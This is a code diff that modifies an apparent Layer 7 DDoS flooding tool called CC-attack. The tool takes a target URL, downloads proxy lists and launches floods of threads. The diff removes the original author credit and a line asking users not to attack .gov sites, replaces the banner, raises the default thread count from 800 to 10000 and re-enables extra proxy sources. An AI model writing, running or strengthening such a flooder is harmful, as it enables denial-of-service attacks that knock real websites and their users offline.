@@ -18,24 +18,10 @@ import os
 
 
 print ('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
-	  CCCCC/   CCCCC/   |___________|/
->--------------------------------------------->
-Version 3.7.1 (2022/3/24)
-                              C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
-├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Added Http Proxy Support       │
-│          [+] Optimization                   │
-│          [+] Changed Varible Name           │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/Leeon123/CC-attack │
+│               ╔═╗╔═╗╔═╗╔╦╗╔╗╔               │
+│               ║ ║╔═╝║   ║ ║║║               │
+│               ╚═╝╚═╝╚═╝ ╩ ╝╚╝               │        
 └─────────────────────────────────────────────┘''')
 
 acceptall = [
@@ -88,7 +74,7 @@ url = ""
 proxy_ver = "5"
 brute = False
 out_file = "proxy.txt"
-thread_num = 800
+thread_num = 10000
 data = ""
 cookies = ""
 ###############################
@@ -532,7 +518,7 @@ def DownloadProxies(proxy_ver):
 			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
 			"https://api.openproxylist.xyz/socks5.txt",
 			"https://www.freeproxychecker.com/result/socks5_proxies.txt",
-			#"http://www.socks24.org/feeds/posts/default"
+			"http://www.socks24.org/feeds/posts/default"
 		]
 		for api in socks5_api:
 			try:
@@ -547,7 +533,7 @@ def DownloadProxies(proxy_ver):
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
 			"https://www.proxy-list.download/api/v1/get?type=http",
 			"https://www.proxyscan.io/download?type=http",
-			#"http://spys.me/proxy.txt",
+			"http://spys.me/proxy.txt",
 			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
 			"https://api.openproxylist.xyz/http.txt",
 			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
@@ -575,7 +561,7 @@ def DownloadProxies(proxy_ver):
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
-	print('''===============  CC-attack help list  ===============
+	print('''===============  CC-Attack Help List  ===============
    -h/help   | showing this message
    -url      | set target url
    -m/mode   | set program mode
@@ -619,7 +605,7 @@ def main():
 		if args=="-m" or args=="-mode":
 			mode = sys.argv[n+1]
 			if mode not in ["cc","post","head"]:#,"slow"]:
-				print("> -m/-mode argument error")
+				print("> -m/-mode Argument Error")
 				return
 		if args =="-v":
 			proxy_ver = sys.argv[n+1]
@@ -630,7 +616,7 @@ def main():
 			elif proxy_ver == "http":
 				proxy_type = 0
 			elif proxy_ver not in ["4","5","http"]:
-				print("> -v argument error (only 4/5/http)")
+				print("> -v Argument Error (only 4/5/http)")
 				return
 		if args == "-b":
 			if sys.argv[n+1] == "1":
@@ -638,13 +624,13 @@ def main():
 			elif sys.argv[n+1] == "0":
 				brute = False
 			else:
-				print("> -b argument error")
+				print("> -b Argument Error")
 				return
 		if args == "-t":
 			try:
 				thread_num = int(sys.argv[n+1])
 			except:
-				print("> -t must be integer")
+				print("> -t Must Be İnteger")
 				return
 		if args == "-cookies":
 			cookies = sys.argv[n+1]
@@ -661,22 +647,22 @@ def main():
 			try:
 				period = int(sys.argv[n+1])
 			except:
-				print("> -s must be integer")
+				print("> -s Must Be İnteger")
 				return
 
 	if download_socks:
 		DownloadProxies(proxy_ver)
 
 	if os.path.exists(out_file)!=True:
-		print("Proxies file not found")
+		print("Proxies File Not Found")
 		return
 	proxies = open(out_file).readlines()	
 	check_list(out_file)
 	proxies = open(out_file).readlines()	
 	if len(proxies) == 0:
-		print("> There are no more proxies. Please download a new proxies list.")
+		print("> There Are No More Proxies. Please Download A New Proxies List.")
 		return
-	print ("> Number Of Proxies: %d" %(len(proxies)))
+	print ("> Number Of Proxies : %d" %(len(proxies)))
 	if check_proxies:
 		check_socks(3)
 
@@ -695,13 +681,13 @@ def main():
 		th.start()
 	else:'''
 	event = threading.Event()
-	print("> Building threads...")
+	print("> Building Threads...")
 	build_threads(mode,thread_num,event,proxy_type)
 	event.clear()
-	#input("Press Enter to continue.")
+	#input("Press Enter To Continue.")
 	event.set()
 	print("> Flooding...")
 	time.sleep(period)
 
 if __name__ == "__main__":
-	main()#Coded by Leeon123
+	main()
